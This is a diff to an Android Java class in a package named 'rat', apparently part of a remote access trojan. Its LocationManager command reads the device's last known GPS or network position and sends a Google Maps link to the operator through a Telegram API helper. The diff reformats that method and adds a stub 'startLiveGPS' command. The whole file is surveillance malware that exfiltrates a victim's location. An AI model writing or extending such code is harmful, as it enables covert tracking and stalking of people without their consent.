@@ -3,6 +3,7 @@ package com.enterprise.rat.commands;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.location.Location;
+import android.os.Looper;
 import com.enterprise.rat.utils.TelegramApi;
 
 public class LocationManager {
@@ -12,17 +13,14 @@ public class LocationManager {
 
     @SuppressLint("MissingPermission")
     public void sendCurrentLocation() {
-        android.location.LocationManager lm = 
+        android.location.LocationManager lm =
             (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
         Location loc = null;
-
         try {
-            if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
+            if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER))
                 loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
-            }
-            if (loc == null && lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)) {
+            if (loc == null && lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER))
                 loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
-            }
 
             if (loc != null) {
                 String mapUrl = "https://www.google.com/maps?q=" + loc.getLatitude() + "," + loc.getLongitude();
@@ -36,5 +34,9 @@ public class LocationManager {
         } catch (Exception e) {
             TelegramApi.sendMessage("❌ Location Error: " + e.getMessage());
         }
+    }
+
+    public void startLiveGPS() {
+        TelegramApi.sendMessage("📍 Live GPS tracking started (simplified)");
     }
 }
